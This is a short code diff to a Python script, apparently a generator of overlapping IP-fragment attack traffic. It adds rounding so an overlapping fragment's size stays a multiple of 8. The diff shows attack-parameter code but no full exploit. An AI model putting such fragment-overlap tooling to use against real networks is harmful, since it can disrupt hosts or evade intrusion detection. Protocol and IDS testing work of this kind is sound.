@@ -2,6 +2,7 @@
 
 import socket
 import random
+from math import ceil
 
 class attackParam:
     def __init__(self,srcIPAddr,destIPAddr,IDField,TTL,protoField,fragSize,allFragms):
@@ -63,6 +64,11 @@ def attackParamGen(srcIP, dstIP):
         if (i==overlapInd):#Overlapping Fragment
             overlapFragOffset=allFragms[i-1]["fragOffset"]+overlapOffset #Shifted back to the previous fragments range so both fragments (the previous normal and now overlapping) have overlapping bytes
             overlapFragSize=overlapSize+maxOverlapSize#Its size is covers the remaining previous nomal fragment and an extra amount (non-overlapping)
+
+            if (i != (totalNumFrags-1)): #to guarantee that overlapping fragments size is a multiple of 8 so that we don't unintentionally corrupt the next fragment too when we shift right by 3 (i.e. divide by 8) in the 'ipHeadFieldGen' function
+                overlapFragSize=ceil(overlapFragSize/8)*8 # round up to the closest multiple of 8 
+                # else do nothing; since its the last fragment and its size doesn't need to be a multiple of 8
+
         else: #Otherwise normal fragment
             overlapFragOffset=currOffset#offset is set to currentoffset counter which is defined later as just the previous offset (normal) + the normal fragment size (i.e. 32)
             overlapFragSize=fragSize#its size is just the normal fragment's size (i.e. 32)
